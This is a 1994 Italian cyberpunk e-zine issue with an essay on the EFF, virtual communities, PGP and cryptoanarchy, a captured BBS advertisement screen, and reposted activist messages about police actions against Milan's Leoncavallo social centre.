Un'infrastruttura comunicativa costituita da soluzioni tecniche di
avanguardia,  capace di collegare in tempo reale  qualsiasi  punto
dell'immensa  nazione  americana.  Il  traffico  dovrebbe   essere
costituito  da  ogni  tipo di informazione  digitale:  messaggi  o
testi,  musica, immagini, televisione e video, tutto idealmente  a
costi accessibili da parte di qualsiasi cittadino.
   
   Da     parte     sua    l'Electronic    Frontier    Foundation,
l'organizzazione  nata  in seguito all'operazione  Sun  Devil  per
tutelare i diritti dei cittadini nel ciberspazio, ha sempre  posto
al  centro  dei  propri obiettivi la costituzione  di  un  network
globale  (un  National  Public Network o una National  Information
Infrastructure) che dovrebbe fare da razzo vettore per la  cultura
e  l'intrattenimento della societa' americana del terzo  millennio.
Fiore  all'occhiello dell'EFF e' l'elaborazione  di  una  serie  di
proposte  operative per l'attuazione concreta di  questo  network,
proposte  che sono state sottoposte ormai piu' volte all'attenzione
del  Congresso degli Stati Uniti e a numerose sottocommissioni per
le  telecomunicazioni. La "moderazione" di queste indicazioni e la
"rispettabilita'" dei membri fondatori hanno consentito all'EFF  di
superare quella diffidenza e quell'alone cospirativo con  cui  era
stata  guardata  in un primo momento - l'EFF come  la  finanziaria
degli hackers? "nossignori, qui si parla di diritti costituzionali
nella  Nuova  Frontiera, si parla della storia degli  Stati  Uniti
d'America  e  Thomas  Jefferson  sarebbe  orgoglioso  dei  ragazzi
dell'EFF".
   
   *Voila'*! Wired 1.3 July/August 1993 ruota intorno ad un lungo e
articolato intervento del solito Mitchell Kapor ("fondatore  della
Lotus  Dev. Corporation, sviluppatore di Lotus 1-2-3, co-fondatore
dell'EFF..." just-in-case-you-don't-know-who-I-am). Where  is  the
Digital  Highway  Really  Heading? The  Case  for  a  Jeffersonian
Information  Policy. A partire da questo titolo il  self-made  man
Kapor   espone   paure  e  speranze  a  proposito   della   futura
infrastruttura  comunicativa, richiamandosi agli ideali  americani
di sempre. Conclude cosi' :
   
   The  Jeffersonian  ideal - a system that  promotes  grass-roots
democracy,    diversity   of   users   and   manufactrers,    true
communications among the people, and all the dazzling  goodies  of
home  shopping,  movies  on demand, teleconferencing,  and  cheap,
instant  databases  -  is  composed og  high  bandwidth,  an  open
architecture, and distributed two-way switching. It's  our  choice
to make. Let's not blow it.
   
   Kapor e' uno  che  sa  quello che dice, e  si  vede.  Ma  cosa
succedera'  ora che anche il Presidente degli Stati Uniti  se   ne
e' accorto, *ed e' d'accordo con lui*?
   
   EFFector    Online   (organo   elettronico   di    informazione
quindicinale della fondazione), Volume 6 No.8,  28 dicembre 1993:
   
   Subject: Gore Endorses EFF's Open Platform Approach.
   
   Washington -- Vice President Al Gore announced at the  National
Press Club today a long-term White House telecommunications policy
initiative  that incorporates the major elements of the Electronic
Frontier Foundation's Open Platform policy recommendations.
   
   The  Vice  President's  speech, which credited  EFF  co-founder
Mitchell  Kapor  for articulating the need for an "open  platform"
information  infrastructure, outlined five policy  principles  for
the National Information Infrastructure (NII).
   
   Kapor  said  that he is "honoured" by the reference  in  Gore's
speech. "I'm awfully happy that the Open Platform is right in  the
middle  of the Administration's infrastructure strategy, and  that
they  see  Open Platform and open access as just as  important  as
competition.
   
   "President  Clinton  and  Vice  President  Gore  deserve  great
credit  for  being the first Administration in over  a  decade  to
offer  a  comprehensive  approach to  telecommunications  policy,"
Kapor  said. "I am looking forward to working with the White House
and the Congress to help see this thing through."
   
   Guardie  e  ladri brindano insieme, Sun Devil e' gia'  lontano.
Alla Frontiera sta arrivando la Civilta'.
   

   2. Comunita virtuali e comunita' reali
   ======================================
   
   La  comunita'  virtuale di cui parla Howard  Rheingold  nel  suo
ultimo  libro e nell'articolo delle pagine precedenti e' quella  di
The   WELL.  Ex-fricchettoni  californiani  ora  trasferitisi  nel
computer  business,  un po' liberal, ma tutto sommato  "gente  per
bene".  Un ottimo esempio di comunita', a dire il vero: un  insieme
di  tratti  culturali  comuni, le norme  di  comportamento  online
rimangono   per  lo  piu'  non  scritte  senza  creare  particolari
problemi,  e quand'anche qualcuno assuma atteggiamenti devianti e' 
sufficiente la riprovazione generale per riacquistare l'omeostasi.
   
   The  WELL e' anche un buon esempio di come lo sviluppo  di  una
personalita'  in   rete   (una  personalita'  solo   apparentemente
"virtuale")  vada ad integrarsi con il resto delle esperienze  che
un  individuo conduce nella vita di tutti i giorni. La capacita' di
gestire  molteplici ruoli e' un requisito essenziale del  "soggetto
moderno":  dai  tempi della rivoluzione industriale l'appartenenza
ad   una   corporazione  non  esaurisce  piu'  le  coordinate   che
identificano  un individuo nella societa'. Oggi i ruoli  di  padre,
marito,    amante,   lavoratore,   giocatore   di    golf,    ateo
esistenzialista o cyberpunk viaggiano su binari diversi.  La  vita
in  rete e' nient'altro  che un binario  in  piu',  una  sfera  di
significati in cui si entra e si esce con l'aiuto di una  tastiera
o di un datasuite. Certo i diversi mondi conservano dei legami tra
loro  ed e' compito  del soggetto trovare  la  funzione  che  gli
permetta di sentirsi a casa propria in ognuno di essi, nel proprio
ruolo  di  leader in una conferenza elettronica hack/phreack  come
con i colleghi del lavoro quotidiano allo sportello bancario.

Tuttavia    la    vita   del   cybernauta   e'  potenzialmente
schizofrenogenica:  in rete  egli trova finalmente  le  condizioni
migliori  per lo *split*. Lo stacco definitivo di una  personalita'
dalle altre, l'orgasmo della modernita'.
   
   Ma  quando anche questo split avvenga, cio' non significa che la
persona  in rete sia necessariamente anonima. Il c-spazio mette  a
disposizione  gli strumenti per costruire un Se' online  attraverso
dinamiche molto simili a quelle tradizionali: dall'interazione con
l'ambiente  emergono infatti i contorni di una  struttura  sociale
"virtuale"  fatta  anch'essa  di  norme,  sanzioni,  processi   di
socializzazione, istituzioni, ruoli. La navigazione  del  soggetto
in quest'universo da' luogo alla definizione della persona in rete:
ogni  azione,  ogni bit comunicativo costituisce un mattone  nella
costruzione di un'identita' che viene riconosciuta, da chi la  vive
e  dagli altri, come identita' concreta che si affianca alle  altre
gia' esistenti.
   
   Chi  si  comporta come uno stronzo e' uno stronzo. Chi entra  in
rete per la prima volta non e' nessuno. *Tabula rasa*.
   
   Rete  come  paradigma  di  uno dei tanti  mondi  della  societa'
"complessa", a chi ci vive rimane il compito di come integrare  (o
non  integrare)  la sua persona in rete con la sua  persona  negli
altri  mondi: quanto a questo, i sistemi telematici XXX-rated  dal
contenuto  erotico sono spesso terreni di gioco per chi  -  magari
persona  "normale" e rispettabile nella vita di tutti  i  giorni -
sente  il bisogno di rendere completamente indipendente una  delle
sue  personalita' dalle altre, sottraendola al dominio della gabbia
familiare/lavorativa/ricreativa in cui si e' andato a  rinchiudere.
Un  rimedio  tardivo e parziale forse, ma anche  una  finestra  di
liberta' per  chi  (si)  e'  condannato  a  vivere  nel   recinto
dell'ortodossia.
   
   In  altri  casi  invece la rete e' solo una  dimensione  in piu'
nella  quale  ribadire  la  propria autonomia.  Ribelli  online  e
offline.
   
   Se  The WELL e' la comunita' virtuale di Howard Rheingold  e  del
sogno  americano,  ordinata  e competitiva,  in  altri  luoghi  si
sviluppano  le  espressioni online del  radicalismo  politico  piu'
spinto.  SPUNK  Press - ad esempio - e' un progetto editoriale  che
vede  nelle risorse telematiche un'arma da guerra di cui fare buon
uso:  opere  storiche del pensiero libertario e anarchico,  saggi,
fanzines,  vengono  digitalizzati e fatti  circolare  in  rete  in
infinite  copie;  il  progetto percorre il c-spazio  in  direzione
trasversale  attraverso continue ramificazioni, da  Internet  alle
reti  amatoriali  di  BBS  su  linea commutata.  Dagli  interstizi
virtuali  piu' reconditi il flusso comunicativo torna  di  nuovo  a
replicarsi su supporto fisico attraverso opportuni gateways con il
mondo  esterno  (ovunque  ci  siano un  pc  e  una  stampante),  a
dimostrazione della continuita' tra esperienze "dentro"  e  "fuori"
la rete. I membri del collettivo di coordinamento di SPUNK Press -
attualmente  in  Olanda, Svezia, Scozia, Italia e  Stati  Uniti  -
interagiscono  e negoziano la loro cooperazione online  mantenendo
un filo invisibile tra comunita' "reali" e "virtuali" e conservando
anche nel ciberspazio gli stessi meccanismi decisionali collaudati
nei   tradizionali   luoghi  di  confine   come   centri   sociali
autogestiti,  squats e comuni di vario tipo. La comunita'  virtuale
di  SPUNK  proviene  da  un  processo di  morphing  che  coinvolge
esperienze di vita reale di tutto il mondo, le trasfigura in  rete
ed e' pronto  a  vomitarle nuovamente fuori sotto  forme  mutanti
imprevedibili.
   
   
 3.  Il  nemico  pubblico numero uno: la crittografia  a  chiave pubblica
 ========================================================================
   
   L'evento  dell'anno 1993 nel cyberspace si chiama  PGP.  Pretty
Good Privacy, un nome perfetto per un pacchetto di crittografia  a
chiave  pubblica di pubblico dominio in rete. La National Security
Agency  e l'FBI hanno tentato di bloccarne la diffusione accusando
l'autore  - Phil Zimmerman - e chi ne ha favorito la distribuzione
all'estero attraverso Internet di "esportazione in paesi stranieri
di  tecnologie  e informazioni che possono nuocere alla  sicurezza
degli  Stati  Uniti  d'America". Si sono sollevati  in  difesa  di
Zimmerman   i  potenti avvocati dell'EFF e c'e' da scommettere  che 
tutto  si  risolvera' in un gran polverone. Anche perche', in ogni
caso,  NSA  e  FBI sono semplicemente arrivati troppo  tardi.  Nel
luglio  1993, tre giorni dopo il rilascio ufficiale della versione
2.3a,  PGP  era  in  Italia completo di codice sorgente  importato
attraverso  il  cyberspace da alcuni dei  piu'  attenti  e  cattivi
technopunx nostrani. Lo stesso e' accaduto per gli altri paesi.
   
   Come  mai  tanto  casino  a causa di un  programma  che e'  una
semplice  implementazione  di algoritimi  matematici  studiati  da
anni?
   
   La  crittografia a chiave pubblica nasce per ovviare a uno  dei
principali  inconvenienti  della  crittografia  tradizionale:   la
disponibilita'  di un canale di comunicazione sicuro attraverso  il
quale  scambiarsi  la chiave di codifica/decodifica.  Se  A  vuole
mandare un messaggio segreto a B, tale che possa essere letto solo
da  quest'ultimo,  A e B devono trovare il modo per  concordare  e
scambiarsi  una chiave; possono vedersi di persona o  usare  altri
mezzi  (telefono,  radio,  altro)  ma  in  ogni  caso  esiste   la
possibilita'  che la chiave venga intercettata nel momento  in  cui
passa da uno all'altro degli interlocutori.
   
   La  crittografia  a  chiave pubblica non  fa  uso  di  un'unica
chiave  comune  a  tutti i partecipanti, bens di  una  coppia  di
chiavi  personali specifiche per ciascun individuo. Ognuno  genera
in  privato la propria coppia: una e' la chiave privata che andra'
tenuta  segreta  (ed alla quale e' associata per maggior  sicurezza
una  parola d'ordine), l'altra e' la chiave pubblica vera e propria
che andra' diffusa in rete. Ogni chiave e' costituita da stringhe di
poche centinaia di bytes, facilmente trasportabili nel cyberspace.
Le   due  chiavi  sono  legate  da  una  relazione  algebrica,  ma
conoscendo  la  chiave  pubblica non e'  in  alcun  modo  possibile
risalire  a  quella  privata  in tempi computazionali  ragionevoli
(diverse  decine  di  anni di calcolo con la  migliore  tecnologia
attuale).
   
   Le  due  chiavi si dividono i compiti: quella pubblica codifica
i  dati, senza poterli decodificare; se A vuole comunicare con  B,
usera'  la  chiave  pubblica di B per crittografare  il  messaggio,
sicuro  che  solo  B e' in possesso della  corrispondente  chiave
privata  (e  della parola d'ordine) che consente  di  risalire  al
testo  in  chiaro.  Naturalmente A deve essere in  possesso  della
chiave  pubblica di B e per questo motivo e' interesse di B che  la
propria  chiave  pubblica venga distribuita il  piu'  possibile  su
tutti  i  canali del c-spazio, tanto piu' che essa ora  puo'  essere
vista anche da terze parti "male intenzionate", che non essendo in
possesso  della  chiave  segreta non  avrebbero  comunque  piu'  la
possibilita' di decodificare il messaggio. Detto per inciso, questo
ha  fatto  nascere una delle tante mode online: la  configurazione
personalizzata  del  proprio editor allo scopo  di  aggiungere  la
propria  chiave  pubblica alla fine di ogni messaggio  immesso  in
rete; inoltre, sempre l'esigenza di diffondere il piu' possibile le
chiavi pubbliche ha condotto alla creazione di archivi/database in
cui  si  puo'  eventualmente  cercare  la  chiave  di  una  persona
specifica  con cui si vuole comunicare in perfetta  privacy  -  un
primo  tentativo in Italia in questo senso e' stato  intrapreso  su
BITs  Against  The  Empire BBS (la tana di  chi  scrive),  che  in
un'area  file  apposita conserva tra le altre le  chiavi  dei  piu'
assidui frequentatori di Cybernet.
   
   Una   seconda  caratteristica  della  crittografia   a   chiave
pubblica e' la possibilita' di firmare un messaggio con la  propria
chiave  privata,  lasciandolo  in  chiaro  (senza  necessariamente
crittografarlo).  Si  tratta del processo  inverso:  B  scrive  un
messaggio, lo sottopone ad un algoritmo in cui vengono usati  come
argomenti la chiave privata (e la parola d'ordine) ed il messaggio
stesso;  il  risultato e' una firma elettronica costituita  da  una
stringa  di  caratteri che viene aggiunta in  fondo  al  testo.  A
riceve  il  messaggio firmato, lo sottopone a verifica utilizzando
la  chiave  pubblica di B ed ottiene la conferma che  solo  B  puo'
averlo scritto.
   
   I  fondamenti  della crittografia a chiave pubblica,  cioe' cio'
che  spiega  come tutto questo sia possibile, vengono trattati  in
testi   specifici  reperibili  nelle  librerie  scientifiche.   Il
software  PGP e' disponibile su molti nodi di Cybernet, in versioni
eseguibili  in  ambiente MS-DOS, Amiga e UNIX, e  sotto  forma  di
codice   sorgente  compilabile  su  qualsiasi  altra   piattaforma
hardware.

4. Cypherpunk, Cryptoanarchy e altre storie
   ========================================

   Lo  sviluppo attuale delle reti e della tecnologia permette  di
pensare  al ciberspazio come ad un luogo piu' ospitale di qualsiasi
spazio  fisico  per  esperimenti  di  nuovi  modelli  di  comunita'
libertarie. Le comuni tradizionali, quand'anche riescano a trovare
un proprio equilibrio, rimangono soggette ad attacchi di ogni tipo
da  parte  di  strutture di potere organizzate e  violente.  Basti
pensare  all'apocalisse di Waco in Texas, ai tentativi  di  creare
collettivita' non-statali in sperdute isolette del Pacifico o  agli
sgomberi di molti Centri Sociali Autogestiti in Italia.
   
   La  Matrice,  Internet, e' invece intrinsecamente decentrata  ed
inattaccabile. E' nata durante la guerra fredda per  resistere  ad
un  attacco  nucleare sovietico, la distruzione  completa  di  uno
qualsiasi  dei suoi nodi non ha nessun effetto sulla vita  globale
della  rete.  E'  transnazionale: le  legislazioni  delle  singole
nazioni  valgono,  al  massimo,  sui  nodi  che  cadono  sotto  la
giurisdizione  statale.  E'  caotica:  due  nodi  possono   essere
collegati  tra  loro attraverso strade diverse.  All'occurrenza  i
nascenti sistemi di remailing e i programmi hackerati di fake-mail
la  rendono  anche  anonima: chi riceve il mio messaggio  non  puo'
sapere che sono stato io a mandarlo, se io non voglio.
   
   In  un  simile  scenario  la  crittografia  a  chiave  pubblica
costituisce il sistema di innesco di questo ordigno -  la  molotov
digitale  piu'  potente  che sia mai stata costruita,  al  servizio
dell'individuo e delle sue liberta'.
   
   Un  programma come PGP permette un grado di confidenza perfetto
tra  persone  che  non  si  sono mai incontrate  fisicamente;  piu'
precisamente, permette confidenza e privacy tra pseudonimi  e  non
tra le rispettive identita' globali. Posso mandare un messaggio  (o
un  file  binario, con dati di qualsiasi tipo)  a  B,  sicuro  che
soltanto  B  potra'  leggerlo. Cosa altrettanto  importante,  posso
essere  assolutamente  sicuro che il messaggio  (firmato)  che  ho
ricevuto  da  B  puo' essere stato scritto esclusivamente  da  lui,
tanto  che  nemmeno  lo stesso B potrebbe piu'  negarlo.  Ma  tutte
queste  relazioni  coinvolgono solo  gli  pseudonimi  a  cui  sono
associate  le  chiavi  pubbliche  e  non  le  altre  facce   della
personalita'  del soggetto "moderno", e tantomeno la  sua  identita'
legale anagrafica.
   
   Stanno  nascendo  banche  e sistemi  di  acquisto  e  pagamento
basate  sul *digicash*, sul denaro digitale  gestito  da  persone-
pseudonimi  e dalle loro chiavi pubbliche (un esempio e' l'istituto
di  credito  fondato ad Amsterdam da David Chaum, che da  anni  si
occupa  di  crittografia  al  locale  Center  of  Mathematics  and
Computer Science).
   
   Insomma,  nello spazio virtuale criptoanarchico posso scegliere
a  quale  livello  condurre  le mie relazioni  sociali  e  le  mie
transazioni economiche, posso scegliere quale delle mie molteplici
identita' rivelare, e a chi. E posso avere piena fiducia nel flusso
di dati proveniente e firmato da uno pseudonimo di cui non conosco
nulla, se non il suo precedente comportamento nel c-spazio.
   
   E'  la  vittoria definitiva dell'attore sociale che  costruisce
(o  distrugge)  invece  di  subire, la vittoria  del  mondo  delle
possibilita'  opposto  a  quello  delle  qualita'  ascritte  e   del
pregiudizio.  Allo  stesso modo puo' essere anche  il  regno  della
cospirazione,  della  massoneria digitale, dei  flussi  di  denaro
incontrollati da un conto bancario all'altro.
   
   *Fuck  Off*! I  pruriti dei benpensanti  servono  a  ben  poco,
esattamente  quanto  i  casi  sollevati  da  NSA  e   FBI   o   le
interrogazioni  sul possibile uso di questa privacy  da  parte  di
terroristi e narcotrafficanti internazionali. La cryptoanarchia e'
arrivata  assieme ai microprocessori degli anni  '90,  risiede  in
pochi  bytes  di dati duplicabili all'infinito e ovunque,  che  ci
piaccia o no, inarrestabili.
   
   5. Conclusioni
   ==============

   Tiriamo  le  fila di tutto questo discorso. Chi  non  si  cabla
oggi,  da solo,  verra' cablato a forza tra qualche tempo o  morira'
di   fame  e  di  stenti.  Il  mondo  terreno  si  e' accorto  del
ciberspazio,  gli piace e sta clonando se' stesso in rete,  con  le
sue strutture di controllo e i suoi meccanismi di regolazione. Dal
gennaio  1994 sono entrati in vigore in Italia nuovi  articoli  di
legge specifici sui reati informatici, sull'hacking e la pirateria
software;  adesso  circolano proposte per regolamentare  il  mondo
delle  BBS  amatoriali, per le quali si prevede l'obbligo  di  una
concessione  apposita. Iniziamo a diventare obiettivi di  campagne
elettorali  e  di posta-spazzatura elettronica. *Gia' visto*. E' un
classico della dialettica tra individuo e sistema sociale: accanto
al  vigore  normativo e alla dimensione burocratica/razionale,  si
esprimono  gli  aspetti piu' conviviali: cyber-cops, cyber-junkies,
cyber-amici  e  cyber-figli-di-puttana, le virtual  communities  e
tutto  il  resto,  l'ufficio anagrafico e  il  bar  di  quartiere,
comunita' e societa' convivono gomito a gomito.
   
   Allo  stesso modo che nel mondo fisico alcune zone piu' di altre
sfuggono  alla  pervasivita'  delle  istituzioni  strutturate:   la
cultura organizzativa di Fidonet, il piu' esteso network amatoriale
(con  20.000  nodi distribuiti capillarmente su  tutto  il  globo)
prevede  che  ogni sua conferenza elettronica abbia un regolamento
formale scritto e un moderatore che ne controlli l'applicazione  -
al contrario, l'esperienza condotta finora su Cybernet si e'basata
invece  proprio sull'assenza esplicita di responsabili e di  norme
codificate. E' la vecchia danza tra l'individuo e il suo ambiente,
in  cui  oscilla l'altalena tra oggettive questioni di vivibilita',
ambizioni personali, potere e necessita' di chiarezza. Naturalmente
ci  sono pro e contro ed e' possibile che anche Cybernet decida  di
dotarsi in futuro di una policy scritta.
   
   La   colonizzazione  del  ciberspazio,  l'Electronic   Frontier
Foundation,  la democrazia elettronica, i gruppi di pressione  che
si  stanno formando anche in Italia a favore dei diritti civili in
rete,  le  comunita' virtuali come The WELL e come SPUNK Press,  le
prospettive della crittografia e della cryptoanarchia. Le forme di
vita  uscite dal primordiale brodo di coltura di questi primi anni
di cataclismi della telecomunicazione globale. Tutto questo impone
delle  scelte anche a chi finora e' sfuggito alla propria mutazione
in una direzione precisa.
   
   Si  puo' decidere di unirsi agli sforzi di chi  lotta  per  una
Societa'  Giusta, perfino per una *Grande Societa'*. Perfino  per la
Libera  Repubblica del Ciberspazio, in cui tutti i cittadini  sono
"uguali" di fronte alla Legge. Oppure si puo' dissolvere il proprio
pseudonimo e teletrasportarlo altrove, ovunque si incontri una TAZ
accogliente,  un  luogo ancora libero protetto  da  una  barricata
digitale  in grado di nasconderlo per qualche tempo alla  vista  e
alle coscienze del mondo esterno.
   
   Lo Spettacolo e' appena cominciato.
   
						       Luc Pac

   
BIBLIOGRAFIA ESSENZIALE:
========================
(tutti i documenti elettronici sono disponibili su vari nodi della
rete Cybernet)

Sui rapporti tra istituzioni pubbliche e ciberspazio:
-----------------------------------------------------

EFFector  Online, bollettino elettronico, tutti i volumi dal  1992
al 1994.

The  White  House  E-Mail  Frequently Asked  Questions,  documento
elettronico, 1993.

Sugli aspetti sociali dell'interazione in rete:
-----------------------------------------------

Howard Rheingold, The Virtual Community, Addison-Wesley, 1993

Luc Pac, Sociologia del Ciberspazio:  la costruzione sociale della
realta' sulle reti telematiche, in preparazione, 1994

Sulla crittografia a chiave pubblica:
-------------------------------------

PGP Pretty Good Privacy User's Manual (allegato al pacchetto PGP)

David  Chaum,  Achieving Electronic Privacy, Scientific  American,
agosto 1992

Su Cryptoanarchy e Cypherpunks:
-------------------------------

Chuck  Hammil, From Crossbows to Cryptography: Thwarting the State
Via Technology, documento elettronico, 1987

Eric Hughes, A Cypherpunk's Manifesto, documento elettronico, 1993

Timothy   C.  May,  The  Crypto  Anarchist  Manifesto,   documento
elettronico, 1988


=====================================================================
PUBBLICITA' REGRESSO
--------------------

ATD
CARRIER 28.800
CONNECT 28.800/VFC

o Locking Com 1 at 38400.
o Connected to Node 4 at 9600 ,8,N,1.
o Connected at 28.800/VFC           
----------------------------------------------------------------------
ProMatrix DOS Shell
Version .21a (c)Copyright The H.C.T. Corporation 01/31/94
             (c)Copyright Hi.T.Moonweed 1992-93
                Licensed To [ One Man Crew ]

C:\1MC>1mc

1) Here are the current Lines setup and some notes on each nodes:
  NODE #1 - ZOOM VFAST   28.8K - Running under Intermail - +972-4-773663
  NODE #2 - USR SPORSTER 14.4K - Running under ProMatrix - +972-4-772638
  NODE #3 - USR SPORSTER 14.4K - Running under ProMatrix - +972-4-772860
  NODE #4 - INTEL v32b   14.4K - Running under ProMatrix - +972-4-773425
  NODE #5 - RACKAL-MILGO 14.4K - Running under ProMatrix - +972-4-773896
  NODE #6 - ZOOM VFAST   28.8K - Running under ProMatrix - +972-4-771706

2) Now that the ZOOM modems are working fine, and this bbs will be getting
   new and new modems and will switch to all 28.8K at the end, it will be
   wise to get one yourself. Leave me message if you want amazing fast
   28.8K modem, and hell it working great in israel. For Registers by
   time: 28.8K will let you download as twice as at 14.4K by the price
   of regular registration.

3) Special CD-ROM offer: Real soon you might be able to get your favorite
   CD-ROMs at the prices of 120Nis (Cost in a store upto 250 - 350 Nis for
   average DISC). Also, you can get your own files wormed up, by only
   $60. For More info leave me a message.

4) Comment us for any problems or complains, we are always around to hear
   you. We can be reached via private mail on this BBS, or by leaving a
   MSG in the Mail-Box.

                       All The Best
                             Bonijoni

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 11


				 LeOnCaVaLlO
				 -----------


	     Solidarieta' ad un Gruppo che lotta per la LIBERTA'
	     ===================================================

     I messaggi che seguono provengono da Decoder BBS, postati dalla rete ECN. 
Leggerli  mi ha fatto molto incazzare perche' mi sono reso conto che di  tutti 
questi casini a Milano la stampa non ha fatto sapere assolutamente NIENTE.
Inoltre, a quanto pare, le forze dell'ordine si muovono in modo molto ... come 
dire ... contestabile.
Speriamo, con questa ns rivista, di poter fare qualcosa anche noi per far  co-
noscere alla comunita' Hacker/Cyberpunk la realta' delle cose.

-------------------------MESSAGGI------------------------------------------


Area: News dai Centri Sociali 
 Msg#: 5264                                         Date: 16 Jul 94  20:38
 From: ECN Milano                                   Read: Yes    Replied: No 
   To: tutti                                        Mark:                     
 Subj: parco lambro '94

SI CERCANO I MORTI PER TRE BARACCHE DI LAMIERA

Alle 18,00 di oggi 16 luglio il comandante dei vigili urbani
in compagnia del capo della Digos e del Vicequestore si e'
presentato all'iniziativa di festa e di lotta in corso da
ieri in via Salomone di fronte al centro sociale Leoncavallo,
esigendo lo smontaggio di tre box di lamiera costruiti sul
marciapiede della medesima via. Al rifiuto unanime opposto
verbalmente e pacificamente dai presenti si e' mosso lo
spropositato apparato che da giorni incombe sulle migliaia di
giovani e meno che quotidianamente hanno cominciato a
frequentare l'iniziativa "Nessuna giustizia nessuna pace".
Solo l'immediata reazione dei presenti e probabilmente la
valutazione delle gravissime conseguenze che avrebbe avuto un
attacco di polizia contro centinaia di persone esasperate
dagli infiniti divieti che opposti dal loro sindaco in questi
mesi, e in questi ultimi tempi in modo ossessivo ha evitato
che la situazione degenerasse.
Il termine provvisorio di questa situazione e' giunto, con la
dichiarazione dei responsabili dell'ordine pubblico, di voler
aspettare la giornata di domani per eseguire la volonta' di
Formentini.
E' incredibile che nella Milano del '94 strutture passibili
di sole sanzioni amministrative mobilitino migliaia di
uomini, decretino la militarizzazione dei quartieri,
producano situazioni di gravissimo pericolo per l'incolumita'
di centinaia di persone.
Ma una citta' in cui in un anno sono arrivate quasi 800
denunce a carico di centinaia di giovani, lavoratori fuori e
dentro la fabbrica, disoccupati appartenenti a quel composito
movimento di associazioni, centri sociali, case occupate; 
una citta' che ha vietato in sei mesi le manifestazioni di
piazza a questo stesso aggregato; in cui si straparla
incredibilmente e ancora di sgomberi di centri sociali,
mentre si discutera' luned in consiglio comunale, su proposta
del PPI e di alcuni rappresentanti della lega, l'assegnazione
di 9 miliardi, gia' stanziati per le politiche giovanili,
alle associazioni e alle cooperative legate alla Compagnia
delle opere, per quel che riguarda la gestione in comodato e
quindi in forma privatistica dei centri sociali territoriali.
Questo con il preciso intento di cancellare dai territori
metropolitani qualunque spazio di autogestione e autogoverno
che si ponga in modo conflittuale rispetto alle politiche
economiche, sociali e culturali della giunta Formentini.
Tale progetto passa anche attraverso la ridefinizione delle
stesse strutture territoriali del decentramento, dai servizi
alle persone a quelli culturali e ricreativi, destinati a
diventare una versione "aggiornata" dell'oratorio, luoghi in
cui raccogliere consensi e omologare le fasce giovanili.
Quindi, oltre la semplice privatizzazione dell'accesso ai
servizi con il pagamento del biglietto di ingresso, si
escludono gli attuali operatori che da anni lavorano
all'interno dei servizi sopperendo con la loro
professionalita' alla carenza di risorse frutto della
pluriennale politica di smantellamento dei servizi sociali.

Intendiamo continuare l'iniziativa in corso mantenendo tutti
gli appuntamenti di dibattito e di lotta gia' annunciati e che
prevedono per i prossimi giorni:
- luned 18 luglio
  ore 6.00 presidio in difesa della casa occupata di via
  dei transiti 18 sotto sgombero
  ore 17.00 saremo presenti in Consiglio comunale
- marted 19 luglio ore 11.00 presidio davanti al tribunale
  in concomitanza con la seconda udienza del processo a carico
  di 17 compagni per iniziative ANTIFASCISTE.

Milano, 16 luglio 1994
Le realta' che partecipano al meeting

  Msg#: 5290                                         Date: 18 Jul 94  15:55
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: Appello a tutti i compagni !!!

"NESSUNA GIUSTIZIA NESSUNA PACE"

L'iniziativa di festa e di lotta "nessuna giustizia nessuna
pace" promossa da varie realta' antagoniste milanesi, e'
stata oggetto dell'ennesimo e pesantissimo attacco da parte
delle truppe inviate dal Sindaco Formentini, che, di fronte
al legittimo esercizio del diritto a costruire momenti di
incontro, di festa, di dibattito e confronto pubblici, ha
dato una soluzione militare a quello che si configurava come
un semplice reato amministrativo.
E' il prosieguo della pratica di negazione degli spazi ormai
costante in questa citta';  l'ennesima ostentazione della
volonta' di annientare qualsiasi realta' che rifiuta logiche
di omologazione.

ALLE 7.30 DI OGGI, UN NUMERO SPROPOSITATO DI CARABINIERI E
AGENTI DI POLIZIA, CHE DA GIORNI STAZIONANO IN PROSSIMITA'
DEL C.S. LEONCAVALLO, CON L'AUSILIO DELLA PROTEZIONE CIVILE E
DELLA POLIZIA MUNICIPALE, HA ISOLATO E MILITARIZZATO GRAN
PARTE DELLA ZONA DI VIA SALOMONE, OPERANDO LO SMONTAGGIO ED
IL SEQUESTRO DELLE STRUTTURE LEGGERE SISTEMATE NELLA
"STRISCIA DI GAZA", L'AREA LARGA POCHI METRI POSTA DI FRONTE
AL CENTRO SOCIALE DI VIA SALOMONE, IN CUI SI E' SVILUPPATA IN
QUESTI GIORNI LA FESTA. OLTRE ALLA PROVOCAZIONE E ALL'ATTACCO
POLITICO, INGENTISSIMO E' IL DANNO ECONOMICO.

Tutto questo mentre si stava svolgendo un presidio di fronte
alla casa occupata di via dei transiti 28, per impedire lo
sgombero di alcuni appartamenti previsto per oggi, Questo
sgombero e' stato rimandato a mercoledi' 20 luglio, giorno in
cui scade l'assegnazione dei locali della ex-Krupp di via
salomone 71 al C.S. Leoncavallo, ed in cui inoltre le 8
famiglie di via Rilke che da piu' di 45 giorni occupano il
consiglio di zona 13 ne dovranno lasciare i locali.

L'ASSEMBLEA DELLE LE REALTA' ORGANIZZATRICI DELL'INIZIATIVA,
SVOLTASI NELLE PRIME ORE DEL POMERIGGIO, HA RIBADITO LA FERMA
VOLONTA' DI MANTENERE IL PROGRAMMA ORIGINARIO, RICONFERMANDO
TUTTI GLI APPUNTAMENTI IN PROGRAMMA, IN QUESTO LUGLIO
MILANESE IN CUI, CON L'USO DELLA VIOLENZA LEGALIZZATA, SI
VOGLIONO CANCELLARE ESPERIENZE UNICHE DI DEMOCRAZIA DIRETTA E
DI AUTOGESTIONE DEL TERRITORIO.

FACCIAMO APPELLO A TUTTI I COMPAGNI AFFINCHE' SIANO PRESENTI
CON LA MASSIMA MOBILITAZIONE E LA MASSIMA DETERMINAZIONE ALLE
PROSSIME SCADENZE DI LOTTA:

MERCOLEDI' 20 LUGLIO
MOBILITAZIONE GENERALE CONTRO GLI SGOMBERI

SABATO 23 LUGLIO
MANIFESTAZIONE NAZIONALE

LE REALTA' ORGANIZZATRICI DEL MEETING "NESSUNA GIUSTIZIA
NESSUNA PACE"
MILANO, 18 LUGLIO 1994

Per informazioni
Centro Sociale Leoncavallo - tel. 02 58014348 - fax 02 26820360
Radio Onda d'Urto - tel. 02 2827494 / 2825884


  Msg#: 5746                                         Date: 30 Jul 94  20:04
  From: Ecn Milano                                   Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: La polizia carica il presidio davanti al consiglio di zona 13 (MI)

Quando il diritto alla casa diventa l'ennesimo attacco repressivo....

Milano, 29/7/94

